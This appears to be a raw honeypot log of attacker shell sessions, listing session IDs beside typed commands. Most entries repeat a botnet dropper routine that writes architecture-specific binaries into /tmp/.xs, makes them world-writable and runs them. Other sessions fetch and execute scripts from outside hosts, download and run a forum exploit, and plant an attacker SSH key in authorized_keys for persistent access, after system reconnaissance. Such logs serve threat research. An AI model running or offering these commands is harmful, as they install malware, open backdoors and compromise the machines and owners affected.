89c20b32c3924347a6bd5277b3071d1a	/tmp/.xs/daemon.mipsel.mod
e022c943f6ee453ca874bcf8f4ef492a	mkdir /tmp/.xs/
e022c943f6ee453ca874bcf8f4ef492a	cat  > /tmp/.xs/test.mod
e022c943f6ee453ca874bcf8f4ef492a	chmod 777 /tmp/.xs/test.mod
e022c943f6ee453ca874bcf8f4ef492a	/tmp/.xs/test.mod
442368215e6e4dd1bf4e3f7e051ddc53	mkdir /tmp/.xs/
442368215e6e4dd1bf4e3f7e051ddc53	cat  > /tmp/.xs/daemon.armv4l.mod
442368215e6e4dd1bf4e3f7e051ddc53	chmod 777 /tmp/.xs/daemon.armv4l.mod
442368215e6e4dd1bf4e3f7e051ddc53	/tmp/.xs/daemon.armv4l.mod
36382f356bbf46668920733cc000d330	mkdir /tmp/.xs/
36382f356bbf46668920733cc000d330	cat  > /tmp/.xs/daemon.i686.mod
36382f356bbf46668920733cc000d330	chmod 777 /tmp/.xs/daemon.i686.mod
36382f356bbf46668920733cc000d330	/tmp/.xs/daemon.i686.mod
ad8b01ca93e44d248ec92e721f1911be	mkdir /tmp/.xs/
ad8b01ca93e44d248ec92e721f1911be	cat  > /tmp/.xs/daemon.mips.mod
ad8b01ca93e44d248ec92e721f1911be	chmod 777 /tmp/.xs/daemon.mips.mod
ad8b01ca93e44d248ec92e721f1911be	/tmp/.xs/daemon.mips.mod
a6a69ebd90294f7cb57a5b5302a3f121	mkdir /tmp/.xs/
a6a69ebd90294f7cb57a5b5302a3f121	cat  > /tmp/.xs/daemon.mipsel.mod
a6a69ebd90294f7cb57a5b5302a3f121	chmod 777 /tmp/.xs/daemon.mipsel.mod
a6a69ebd90294f7cb57a5b5302a3f121	/tmp/.xs/daemon.mipsel.mod
68b67ac816844bbf991546857f7e8984	mkdir /tmp/.xs/
68b67ac816844bbf991546857f7e8984	cat  > /tmp/.xs/test.mod
68b67ac816844bbf991546857f7e8984	chmod 777 /tmp/.xs/test.mod
68b67ac816844bbf991546857f7e8984	/tmp/.xs/test.mod
a59ce387fd3c4a23be0da4c60ce51d02	mkdir /tmp/.xs/
a59ce387fd3c4a23be0da4c60ce51d02	cat  > /tmp/.xs/daemon.armv4l.mod
a59ce387fd3c4a23be0da4c60ce51d02	chmod 777 /tmp/.xs/daemon.armv4l.mod
a59ce387fd3c4a23be0da4c60ce51d02	/tmp/.xs/daemon.armv4l.mod
2d180a680cb24522a4a63b2ee352ea55	mkdir /tmp/.xs/
2d180a680cb24522a4a63b2ee352ea55	cat  > /tmp/.xs/daemon.i686.mod
2d180a680cb24522a4a63b2ee352ea55	chmod 777 /tmp/.xs/daemon.i686.mod
2d180a680cb24522a4a63b2ee352ea55	/tmp/.xs/daemon.i686.mod
57f34b149844492ca24a910be8a3e481	mkdir /tmp/.xs/
57f34b149844492ca24a910be8a3e481	cat  > /tmp/.xs/daemon.mips.mod
57f34b149844492ca24a910be8a3e481	chmod 777 /tmp/.xs/daemon.mips.mod
57f34b149844492ca24a910be8a3e481	/tmp/.xs/daemon.mips.mod
2d9fb45990fa4a2b979b7f1ba4132f7b	mkdir /tmp/.xs/
2d9fb45990fa4a2b979b7f1ba4132f7b	cat  > /tmp/.xs/daemon.mipsel.mod
2d9fb45990fa4a2b979b7f1ba4132f7b	chmod 777 /tmp/.xs/daemon.mipsel.mod
2d9fb45990fa4a2b979b7f1ba4132f7b	/tmp/.xs/daemon.mipsel.mod
126c946f07284d37abb4517f48f0567b	mkdir /tmp/.xs/
126c946f07284d37abb4517f48f0567b	cat  > /tmp/.xs/test.mod
126c946f07284d37abb4517f48f0567b	chmod 777 /tmp/.xs/test.mod
126c946f07284d37abb4517f48f0567b	/tmp/.xs/test.mod
653bc4ab758a4edeafac5b1a025ed911	mkdir /tmp/.xs/
653bc4ab758a4edeafac5b1a025ed911	cat  > /tmp/.xs/daemon.armv4l.mod
653bc4ab758a4edeafac5b1a025ed911	chmod 777 /tmp/.xs/daemon.armv4l.mod
653bc4ab758a4edeafac5b1a025ed911	/tmp/.xs/daemon.armv4l.mod
1691ba8dd0624a1a90448512f09ace0d	mkdir /tmp/.xs/
1691ba8dd0624a1a90448512f09ace0d	cat  > /tmp/.xs/daemon.i686.mod
1691ba8dd0624a1a90448512f09ace0d	chmod 777 /tmp/.xs/daemon.i686.mod
1691ba8dd0624a1a90448512f09ace0d	/tmp/.xs/daemon.i686.mod
31eecfaca19c483c9b9727632958ca70	mkdir /tmp/.xs/
31eecfaca19c483c9b9727632958ca70	cat  > /tmp/.xs/daemon.mips.mod
31eecfaca19c483c9b9727632958ca70	chmod 777 /tmp/.xs/daemon.mips.mod
31eecfaca19c483c9b9727632958ca70	/tmp/.xs/daemon.mips.mod
daf2c5f634144793a4cc387e1b428282	mkdir /tmp/.xs/
daf2c5f634144793a4cc387e1b428282	cat  > /tmp/.xs/daemon.mipsel.mod
daf2c5f634144793a4cc387e1b428282	chmod 777 /tmp/.xs/daemon.mipsel.mod
daf2c5f634144793a4cc387e1b428282	/tmp/.xs/daemon.mipsel.mod
a45674ea2b884ad3ae5d3fb2ce11902d	mkdir /tmp/.xs/
a45674ea2b884ad3ae5d3fb2ce11902d	cat  > /tmp/.xs/test.mod
a45674ea2b884ad3ae5d3fb2ce11902d	chmod 777 /tmp/.xs/test.mod
a45674ea2b884ad3ae5d3fb2ce11902d	/tmp/.xs/test.mod
dd81615b17d8452cbbe08be1300b48ef	mkdir /tmp/.xs/
dd81615b17d8452cbbe08be1300b48ef	cat  > /tmp/.xs/daemon.armv4l.mod
dd81615b17d8452cbbe08be1300b48ef	chmod 777 /tmp/.xs/daemon.armv4l.mod
dd81615b17d8452cbbe08be1300b48ef	/tmp/.xs/daemon.armv4l.mod
ab780c48aab441b091dba4e9adb40226	mkdir /tmp/.xs/
ab780c48aab441b091dba4e9adb40226	cat  > /tmp/.xs/daemon.i686.mod
ab780c48aab441b091dba4e9adb40226	chmod 777 /tmp/.xs/daemon.i686.mod
ab780c48aab441b091dba4e9adb40226	/tmp/.xs/daemon.i686.mod
a6770d79e4f34d6b83ec281f5a28d80a	mkdir /tmp/.xs/
a6770d79e4f34d6b83ec281f5a28d80a	cat  > /tmp/.xs/daemon.mips.mod
a6770d79e4f34d6b83ec281f5a28d80a	chmod 777 /tmp/.xs/daemon.mips.mod
a6770d79e4f34d6b83ec281f5a28d80a	/tmp/.xs/daemon.mips.mod
f5f42b3776164cdab615a4b7f43a1555	mkdir /tmp/.xs/
f5f42b3776164cdab615a4b7f43a1555	cat  > /tmp/.xs/daemon.mipsel.mod
f5f42b3776164cdab615a4b7f43a1555	chmod 777 /tmp/.xs/daemon.mipsel.mod
f5f42b3776164cdab615a4b7f43a1555	/tmp/.xs/daemon.mipsel.mod
56284e35a7eb400e9b3982a6d9a8c09b	mkdir /tmp/.xs/
56284e35a7eb400e9b3982a6d9a8c09b	cat  > /tmp/.xs/test.mod
56284e35a7eb400e9b3982a6d9a8c09b	chmod 777 /tmp/.xs/test.mod
56284e35a7eb400e9b3982a6d9a8c09b	/tmp/.xs/test.mod
f808ea78867144d49928bd6fcabe18bc	mkdir /tmp/.xs/
f808ea78867144d49928bd6fcabe18bc	cat  > /tmp/.xs/daemon.armv4l.mod
f808ea78867144d49928bd6fcabe18bc	chmod 777 /tmp/.xs/daemon.armv4l.mod
f808ea78867144d49928bd6fcabe18bc	/tmp/.xs/daemon.armv4l.mod
c67a144537f54c8e8a830d3362bc7cfa	mkdir /tmp/.xs/
c67a144537f54c8e8a830d3362bc7cfa	cat  > /tmp/.xs/daemon.i686.mod
c67a144537f54c8e8a830d3362bc7cfa	chmod 777 /tmp/.xs/daemon.i686.mod
c67a144537f54c8e8a830d3362bc7cfa	/tmp/.xs/daemon.i686.mod
0f924be4a7fd4ee78800a46ceb1c81f0	mkdir /tmp/.xs/
0f924be4a7fd4ee78800a46ceb1c81f0	cat  > /tmp/.xs/daemon.mips.mod
0f924be4a7fd4ee78800a46ceb1c81f0	chmod 777 /tmp/.xs/daemon.mips.mod
0f924be4a7fd4ee78800a46ceb1c81f0	/tmp/.xs/daemon.mips.mod
cc565fa2a5864ccebd95d066d8021adf	mkdir /tmp/.xs/
cc565fa2a5864ccebd95d066d8021adf	cat  > /tmp/.xs/daemon.mipsel.mod
cc565fa2a5864ccebd95d066d8021adf	chmod 777 /tmp/.xs/daemon.mipsel.mod
cc565fa2a5864ccebd95d066d8021adf	/tmp/.xs/daemon.mipsel.mod
2d33ea3ab4cc4dba9d86421fd5e99f9a	mkdir /tmp/.xs/
2d33ea3ab4cc4dba9d86421fd5e99f9a	cat  > /tmp/.xs/test.mod
2d33ea3ab4cc4dba9d86421fd5e99f9a	chmod 777 /tmp/.xs/test.mod
2d33ea3ab4cc4dba9d86421fd5e99f9a	/tmp/.xs/test.mod
10e00fb1e2a14e9a9095a12e9c5fbbb8	mkdir /tmp/.xs/
10e00fb1e2a14e9a9095a12e9c5fbbb8	cat  > /tmp/.xs/daemon.armv4l.mod
10e00fb1e2a14e9a9095a12e9c5fbbb8	chmod 777 /tmp/.xs/daemon.armv4l.mod
10e00fb1e2a14e9a9095a12e9c5fbbb8	/tmp/.xs/daemon.armv4l.mod
248d158f9bd541aaaf24e3f7e7996dfc	mkdir /tmp/.xs/
248d158f9bd541aaaf24e3f7e7996dfc	cat  > /tmp/.xs/daemon.i686.mod
248d158f9bd541aaaf24e3f7e7996dfc	chmod 777 /tmp/.xs/daemon.i686.mod
248d158f9bd541aaaf24e3f7e7996dfc	/tmp/.xs/daemon.i686.mod
b1c67bd7375742689be0ae170725d79b	mkdir /tmp/.xs/
b1c67bd7375742689be0ae170725d79b	cat  > /tmp/.xs/daemon.mips.mod
b1c67bd7375742689be0ae170725d79b	chmod 777 /tmp/.xs/daemon.mips.mod
b1c67bd7375742689be0ae170725d79b	/tmp/.xs/daemon.mips.mod
ca24d6d899f84a4c9581a0d1507e443d	mkdir /tmp/.xs/
ca24d6d899f84a4c9581a0d1507e443d	cat  > /tmp/.xs/daemon.mipsel.mod
ca24d6d899f84a4c9581a0d1507e443d	chmod 777 /tmp/.xs/daemon.mipsel.mod
ca24d6d899f84a4c9581a0d1507e443d	/tmp/.xs/daemon.mipsel.mod
9a693f2376ea4e2cadc13410195481ab	mkdir /tmp/.xs/
9a693f2376ea4e2cadc13410195481ab	cat  > /tmp/.xs/test.mod
9a693f2376ea4e2cadc13410195481ab	chmod 777 /tmp/.xs/test.mod
9a693f2376ea4e2cadc13410195481ab	/tmp/.xs/test.mod
8d361de3aaae479fb7b94b48a8979509	mkdir /tmp/.xs/
8d361de3aaae479fb7b94b48a8979509	cat  > /tmp/.xs/daemon.armv4l.mod
8d361de3aaae479fb7b94b48a8979509	chmod 777 /tmp/.xs/daemon.armv4l.mod
8d361de3aaae479fb7b94b48a8979509	/tmp/.xs/daemon.armv4l.mod
2c4838c4de2044d480e1aef457054b85	mkdir /tmp/.xs/
2c4838c4de2044d480e1aef457054b85	cat  > /tmp/.xs/daemon.i686.mod
2c4838c4de2044d480e1aef457054b85	chmod 777 /tmp/.xs/daemon.i686.mod
2c4838c4de2044d480e1aef457054b85	/tmp/.xs/daemon.i686.mod
ae3d625dc43f4d2888ed3af362930c41	mkdir /tmp/.xs/
ae3d625dc43f4d2888ed3af362930c41	cat  > /tmp/.xs/daemon.mips.mod
ae3d625dc43f4d2888ed3af362930c41	chmod 777 /tmp/.xs/daemon.mips.mod
ae3d625dc43f4d2888ed3af362930c41	/tmp/.xs/daemon.mips.mod
b5429d3bef0d4aada403cbef820c429a	mkdir /tmp/.xs/
b5429d3bef0d4aada403cbef820c429a	cat  > /tmp/.xs/daemon.mipsel.mod
b5429d3bef0d4aada403cbef820c429a	chmod 777 /tmp/.xs/daemon.mipsel.mod
b5429d3bef0d4aada403cbef820c429a	/tmp/.xs/daemon.mipsel.mod
d6a2d92a4608419aaecd4c918966b414	mkdir /tmp/.xs/
d6a2d92a4608419aaecd4c918966b414	cat  > /tmp/.xs/test.mod
d6a2d92a4608419aaecd4c918966b414	chmod 777 /tmp/.xs/test.mod
d6a2d92a4608419aaecd4c918966b414	/tmp/.xs/test.mod
91466fb726be4c53b22c7b17233f12f0	mkdir /tmp/.xs/
91466fb726be4c53b22c7b17233f12f0	cat  > /tmp/.xs/daemon.armv4l.mod
91466fb726be4c53b22c7b17233f12f0	chmod 777 /tmp/.xs/daemon.armv4l.mod
91466fb726be4c53b22c7b17233f12f0	/tmp/.xs/daemon.armv4l.mod
97f83b6d94e94cd291d722ea9a37e384	mkdir /tmp/.xs/
97f83b6d94e94cd291d722ea9a37e384	cat  > /tmp/.xs/daemon.i686.mod
97f83b6d94e94cd291d722ea9a37e384	chmod 777 /tmp/.xs/daemon.i686.mod
97f83b6d94e94cd291d722ea9a37e384	/tmp/.xs/daemon.i686.mod
e9c463e236bb4fdaa43771cd733d01d7	mkdir /tmp/.xs/
e9c463e236bb4fdaa43771cd733d01d7	cat  > /tmp/.xs/daemon.mips.mod
e9c463e236bb4fdaa43771cd733d01d7	chmod 777 /tmp/.xs/daemon.mips.mod
e9c463e236bb4fdaa43771cd733d01d7	/tmp/.xs/daemon.mips.mod
6470721d0ae1422697f3a25087cbcd90	mkdir /tmp/.xs/
6470721d0ae1422697f3a25087cbcd90	cat  > /tmp/.xs/daemon.mipsel.mod
6470721d0ae1422697f3a25087cbcd90	chmod 777 /tmp/.xs/daemon.mipsel.mod
6470721d0ae1422697f3a25087cbcd90	/tmp/.xs/daemon.mipsel.mod
3797b2dca43e4d9d9d291da2a9e0f770	mkdir /tmp/.xs/
3797b2dca43e4d9d9d291da2a9e0f770	cat  > /tmp/.xs/test.mod
3797b2dca43e4d9d9d291da2a9e0f770	chmod 777 /tmp/.xs/test.mod
3797b2dca43e4d9d9d291da2a9e0f770	/tmp/.xs/test.mod
dc12c2be7e7548379b5fda4fc59bd339	mkdir /tmp/.xs/
dc12c2be7e7548379b5fda4fc59bd339	cat  > /tmp/.xs/daemon.armv4l.mod
dc12c2be7e7548379b5fda4fc59bd339	chmod 777 /tmp/.xs/daemon.armv4l.mod
dc12c2be7e7548379b5fda4fc59bd339	/tmp/.xs/daemon.armv4l.mod
163736a9c7864a5e8e7ddd75eb9c2e32	mkdir /tmp/.xs/
163736a9c7864a5e8e7ddd75eb9c2e32	cat  > /tmp/.xs/daemon.i686.mod
163736a9c7864a5e8e7ddd75eb9c2e32	chmod 777 /tmp/.xs/daemon.i686.mod
163736a9c7864a5e8e7ddd75eb9c2e32	/tmp/.xs/daemon.i686.mod
284ab0de247f4a37bc8ec6e709a84ab9	mkdir /tmp/.xs/
284ab0de247f4a37bc8ec6e709a84ab9	cat  > /tmp/.xs/daemon.mips.mod
284ab0de247f4a37bc8ec6e709a84ab9	chmod 777 /tmp/.xs/daemon.mips.mod
284ab0de247f4a37bc8ec6e709a84ab9	/tmp/.xs/daemon.mips.mod
295f0bbd1f764a44b83fbd1b7949846e	mkdir /tmp/.xs/
295f0bbd1f764a44b83fbd1b7949846e	cat  > /tmp/.xs/daemon.mipsel.mod
295f0bbd1f764a44b83fbd1b7949846e	chmod 777 /tmp/.xs/daemon.mipsel.mod
295f0bbd1f764a44b83fbd1b7949846e	/tmp/.xs/daemon.mipsel.mod
50eec4d9e53f4fa1a67bb71a308b1974	mkdir /tmp/.xs/
50eec4d9e53f4fa1a67bb71a308b1974	cat  > /tmp/.xs/test.mod
50eec4d9e53f4fa1a67bb71a308b1974	chmod 777 /tmp/.xs/test.mod
50eec4d9e53f4fa1a67bb71a308b1974	/tmp/.xs/test.mod
dfd26749bb9a4f7db2daf7c22741be05	mkdir /tmp/.xs/
dfd26749bb9a4f7db2daf7c22741be05	cat  > /tmp/.xs/daemon.armv4l.mod
dfd26749bb9a4f7db2daf7c22741be05	chmod 777 /tmp/.xs/daemon.armv4l.mod
dfd26749bb9a4f7db2daf7c22741be05	/tmp/.xs/daemon.armv4l.mod
57b5e1a7141f45fcbad3ead57b67e4d3	mkdir /tmp/.xs/
57b5e1a7141f45fcbad3ead57b67e4d3	cat  > /tmp/.xs/daemon.i686.mod
57b5e1a7141f45fcbad3ead57b67e4d3	chmod 777 /tmp/.xs/daemon.i686.mod
57b5e1a7141f45fcbad3ead57b67e4d3	/tmp/.xs/daemon.i686.mod
aafc18c11b4147a4b97e69a8ee17a03c	mkdir /tmp/.xs/
aafc18c11b4147a4b97e69a8ee17a03c	cat  > /tmp/.xs/daemon.mips.mod
aafc18c11b4147a4b97e69a8ee17a03c	chmod 777 /tmp/.xs/daemon.mips.mod
aafc18c11b4147a4b97e69a8ee17a03c	/tmp/.xs/daemon.mips.mod
1f5f76d338a94f6493cb12774a3a5a6d	mkdir /tmp/.xs/
1f5f76d338a94f6493cb12774a3a5a6d	cat  > /tmp/.xs/daemon.mipsel.mod
1f5f76d338a94f6493cb12774a3a5a6d	chmod 777 /tmp/.xs/daemon.mipsel.mod
1f5f76d338a94f6493cb12774a3a5a6d	/tmp/.xs/daemon.mipsel.mod
faac677bb1bf435190fbda17d32cb1a9	mkdir /tmp/.xs/
faac677bb1bf435190fbda17d32cb1a9	cat  > /tmp/.xs/test.mod
faac677bb1bf435190fbda17d32cb1a9	chmod 777 /tmp/.xs/test.mod
faac677bb1bf435190fbda17d32cb1a9	/tmp/.xs/test.mod
f21bf11b49354a56b01a40be1372ddc0	mkdir /tmp/.xs/
f21bf11b49354a56b01a40be1372ddc0	cat  > /tmp/.xs/daemon.armv4l.mod
f21bf11b49354a56b01a40be1372ddc0	chmod 777 /tmp/.xs/daemon.armv4l.mod
f21bf11b49354a56b01a40be1372ddc0	/tmp/.xs/daemon.armv4l.mod
0202407d60274e0da688d26daf048939	mkdir /tmp/.xs/
0202407d60274e0da688d26daf048939	cat  > /tmp/.xs/daemon.i686.mod
0202407d60274e0da688d26daf048939	chmod 777 /tmp/.xs/daemon.i686.mod
0202407d60274e0da688d26daf048939	/tmp/.xs/daemon.i686.mod
630e1ae431e84dfaa85ad41a07b4d0e2	mkdir /tmp/.xs/
630e1ae431e84dfaa85ad41a07b4d0e2	cat  > /tmp/.xs/daemon.mips.mod
630e1ae431e84dfaa85ad41a07b4d0e2	chmod 777 /tmp/.xs/daemon.mips.mod
630e1ae431e84dfaa85ad41a07b4d0e2	/tmp/.xs/daemon.mips.mod
1c323a069a6b4be185630100c2188fb2	mkdir /tmp/.xs/
1c323a069a6b4be185630100c2188fb2	cat  > /tmp/.xs/daemon.mipsel.mod
1c323a069a6b4be185630100c2188fb2	chmod 777 /tmp/.xs/daemon.mipsel.mod
1c323a069a6b4be185630100c2188fb2	/tmp/.xs/daemon.mipsel.mod
c6161f8678794d43af3c52561539658d	mkdir /tmp/.xs/
c6161f8678794d43af3c52561539658d	cat  > /tmp/.xs/test.mod
c6161f8678794d43af3c52561539658d	chmod 777 /tmp/.xs/test.mod
c6161f8678794d43af3c52561539658d	/tmp/.xs/test.mod
6ce7c2042bed42208f29226848967382	mkdir /tmp/.xs/
6ce7c2042bed42208f29226848967382	cat  > /tmp/.xs/daemon.armv4l.mod
6ce7c2042bed42208f29226848967382	chmod 777 /tmp/.xs/daemon.armv4l.mod
6ce7c2042bed42208f29226848967382	/tmp/.xs/daemon.armv4l.mod
efddbcc074164bdabffe9caf7a10034a	mkdir /tmp/.xs/
efddbcc074164bdabffe9caf7a10034a	cat  > /tmp/.xs/daemon.i686.mod
efddbcc074164bdabffe9caf7a10034a	chmod 777 /tmp/.xs/daemon.i686.mod
efddbcc074164bdabffe9caf7a10034a	/tmp/.xs/daemon.i686.mod
346d7962f51443c4bc1f559a180e158e	mkdir /tmp/.xs/
346d7962f51443c4bc1f559a180e158e	cat  > /tmp/.xs/daemon.mips.mod
346d7962f51443c4bc1f559a180e158e	chmod 777 /tmp/.xs/daemon.mips.mod
346d7962f51443c4bc1f559a180e158e	/tmp/.xs/daemon.mips.mod
7f138bde8e80435b88fae92407fa9173	mkdir /tmp/.xs/
7f138bde8e80435b88fae92407fa9173	cat  > /tmp/.xs/daemon.mipsel.mod
7f138bde8e80435b88fae92407fa9173	chmod 777 /tmp/.xs/daemon.mipsel.mod
7f138bde8e80435b88fae92407fa9173	/tmp/.xs/daemon.mipsel.mod
8ac9eac7f0cc46e6827c46fba6378e53	mkdir /tmp/.xs/
8ac9eac7f0cc46e6827c46fba6378e53	cat  > /tmp/.xs/test.mod
8ac9eac7f0cc46e6827c46fba6378e53	chmod 777 /tmp/.xs/test.mod
8ac9eac7f0cc46e6827c46fba6378e53	/tmp/.xs/test.mod
0b118b8979a14e8f80bff29d6f3a540d	mkdir /tmp/.xs/
0b118b8979a14e8f80bff29d6f3a540d	cat  > /tmp/.xs/daemon.armv4l.mod
0b118b8979a14e8f80bff29d6f3a540d	chmod 777 /tmp/.xs/daemon.armv4l.mod
0b118b8979a14e8f80bff29d6f3a540d	/tmp/.xs/daemon.armv4l.mod
683f896937974538ba1a94953b7885e8	mkdir /tmp/.xs/
683f896937974538ba1a94953b7885e8	cat  > /tmp/.xs/daemon.i686.mod
683f896937974538ba1a94953b7885e8	chmod 777 /tmp/.xs/daemon.i686.mod
683f896937974538ba1a94953b7885e8	/tmp/.xs/daemon.i686.mod
4ca696eee79f4aac8fdc1fcdbb40f8e5	mkdir /tmp/.xs/
4ca696eee79f4aac8fdc1fcdbb40f8e5	cat  > /tmp/.xs/daemon.mips.mod
4ca696eee79f4aac8fdc1fcdbb40f8e5	chmod 777 /tmp/.xs/daemon.mips.mod
4ca696eee79f4aac8fdc1fcdbb40f8e5	/tmp/.xs/daemon.mips.mod
ecd0abc2434d4276bedee3af8c028bb2	mkdir /tmp/.xs/
ecd0abc2434d4276bedee3af8c028bb2	cat  > /tmp/.xs/daemon.mipsel.mod
ecd0abc2434d4276bedee3af8c028bb2	chmod 777 /tmp/.xs/daemon.mipsel.mod
ecd0abc2434d4276bedee3af8c028bb2	/tmp/.xs/daemon.mipsel.mod
5eb14b5bd522435bb726c9216c73a554	mkdir /tmp/.xs/
5eb14b5bd522435bb726c9216c73a554	cat  > /tmp/.xs/test.mod
5eb14b5bd522435bb726c9216c73a554	chmod 777 /tmp/.xs/test.mod
5eb14b5bd522435bb726c9216c73a554	/tmp/.xs/test.mod
b1cde7db783745d7b0f835c182151712	w
b1cde7db783745d7b0f835c182151712	ls
b1cde7db783745d7b0f835c182151712	wget bossu.pe.hu/ssh.txt
b1cde7db783745d7b0f835c182151712	perl ssh.txt
b1cde7db783745d7b0f835c182151712	apt-get update
b1cde7db783745d7b0f835c182151712	ks
b1cde7db783745d7b0f835c182151712	exit
abaecb0b597347f3ba4cf575f1b5aead	cd /tmp
abaecb0b597347f3ba4cf575f1b5aead	wget http://185.61.138.133/xex.sh
cf6efb2559de4d4f89c410cf41ba9d85	uname
cf6efb2559de4d4f89c410cf41ba9d85	free -m
cf6efb2559de4d4f89c410cf41ba9d85	ps x
d14b782c2c5447c7a5eac16a1a2cd3d7	uname
d14b782c2c5447c7a5eac16a1a2cd3d7	free -m
d14b782c2c5447c7a5eac16a1a2cd3d7	ps x
07432c65eea9451e95ab71e37313c9b6	ls
07432c65eea9451e95ab71e37313c9b6	cat /proc/cpuinfo
07432c65eea9451e95ab71e37313c9b6	uname -a
07432c65eea9451e95ab71e37313c9b6	cat /etc/issue
07432c65eea9451e95ab71e37313c9b6	wget
07432c65eea9451e95ab71e37313c9b6	ls
07432c65eea9451e95ab71e37313c9b6	hostname Enzo
07432c65eea9451e95ab71e37313c9b6	ls
07432c65eea9451e95ab71e37313c9b6	wget http://downloads.securityfocus.com/vulnerabilities/exploits/IPB_sedXPL.pl
07432c65eea9451e95ab71e37313c9b6	ls
07432c65eea9451e95ab71e37313c9b6	chmod +x (*
07432c65eea9451e95ab71e37313c9b6	chmod +X *
07432c65eea9451e95ab71e37313c9b6	chmod +x *
07432c65eea9451e95ab71e37313c9b6	ls
07432c65eea9451e95ab71e37313c9b6	perl IPB_sedXPL.pl
07432c65eea9451e95ab71e37313c9b6	yum install perl
07432c65eea9451e95ab71e37313c9b6	apt-get install perl
07432c65eea9451e95ab71e37313c9b6	ls
07432c65eea9451e95ab71e37313c9b6	perl IPB_sedXPL.pl
07432c65eea9451e95ab71e37313c9b6	chmod +x *
07432c65eea9451e95ab71e37313c9b6	perl IPB_sedXPL.pl
f59633a815d6485c91c0ede19939dc7f	w
f59633a815d6485c91c0ede19939dc7f	ls -a
f59633a815d6485c91c0ede19939dc7f	uname -a
f59633a815d6485c91c0ede19939dc7f	cat /etc/hosts
f59633a815d6485c91c0ede19939dc7f	cd ~
f59633a815d6485c91c0ede19939dc7f	mkdir .ssh
f59633a815d6485c91c0ede19939dc7f	cd .ssh
f59633a815d6485c91c0ede19939dc7f	echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIB8NTwrTVNx8KZwzNj067GiIfz8Vc2DgqvmEatkwH1hjiM/jdrq2VFEAJI75AIdarHo1jVL7ZcpsmiIJQ3Pi+P0JdAXARK8PJEZyRQJLJusucbJeU9FI4drnPceKKthaSjVl/9bWa6ckmrYaFIfnNZtAH9CAWn6TCGb5lDfKdgC5Q== X-remuser"  >  >  authorized_keys
f59633a815d6485c91c0ede19939dc7f	chmod 700 ~/.ssh
f59633a815d6485c91c0ede19939dc7f	chmod 600 ~/.ssh/authorized_keys
f59633a815d6485c91c0ede19939dc7f	cd ~
f59633a815d6485c91c0ede19939dc7f	ls -a
f59633a815d6485c91c0ede19939dc7f	ls -a
f59633a815d6485c91c0ede19939dc7f	ls -a
f59633a815d6485c91c0ede19939dc7f	wget http://blackteam.altervista.org/blackteam/autobnc.tgz
f59633a815d6485c91c0ede19939dc7f	ls -a
f59633a815d6485c91c0ede19939dc7f	tar xvzf autobnc.tgz
b23072df2b614198a7569ce4c2050d5c	uname
b23072df2b614198a7569ce4c2050d5c	free -m
b23072df2b614198a7569ce4c2050d5c	ps x
7894a399ff614928bb36cd67e10a7306	uname
7894a399ff614928bb36cd67e10a7306	free -m
7894a399ff614928bb36cd67e10a7306	ps x
8de813d4d145483d86079ae238f8e8ff	echo -n test
8de813d4d145483d86079ae238f8e8ff	cat /proc/version
3acf53ce05574af2b0bc86ff32304844	echo -n test
3acf53ce05574af2b0bc86ff32304844	cat /proc/version
d3d14716e2fb4d47b94bb27147718a14	mkdir /tmp/.xs/
d3d14716e2fb4d47b94bb27147718a14	cat  > /tmp/.xs/daemon.armv4l.mod
7bfae782c6e1419b93a105c7c614f6f9	mkdir /tmp/.xs/
7bfae782c6e1419b93a105c7c614f6f9	cat  > /tmp/.xs/daemon.armv4l.mod
d3d14716e2fb4d47b94bb27147718a14	chmod 777 /tmp/.xs/daemon.armv4l.mod
d3d14716e2fb4d47b94bb27147718a14	/tmp/.xs/daemon.armv4l.mod
7bfae782c6e1419b93a105c7c614f6f9	chmod 777 /tmp/.xs/daemon.armv4l.mod
7bfae782c6e1419b93a105c7c614f6f9	/tmp/.xs/daemon.armv4l.mod
4a214c19ca8142fead7768610d1dacc3	mkdir /tmp/.xs/
4a214c19ca8142fead7768610d1dacc3	cat  > /tmp/.xs/daemon.i686.mod
52f244d2382741e7af20c0e68b6ca2c1	mkdir /tmp/.xs/
52f244d2382741e7af20c0e68b6ca2c1	cat  > /tmp/.xs/daemon.i686.mod
4a214c19ca8142fead7768610d1dacc3	chmod 777 /tmp/.xs/daemon.i686.mod
4a214c19ca8142fead7768610d1dacc3	/tmp/.xs/daemon.i686.mod
52f244d2382741e7af20c0e68b6ca2c1	chmod 777 /tmp/.xs/daemon.i686.mod
52f244d2382741e7af20c0e68b6ca2c1	/tmp/.xs/daemon.i686.mod
cbf2448f0542488e947f97e56dcf75a3	mkdir /tmp/.xs/
cbf2448f0542488e947f97e56dcf75a3	cat  > /tmp/.xs/daemon.mips.mod
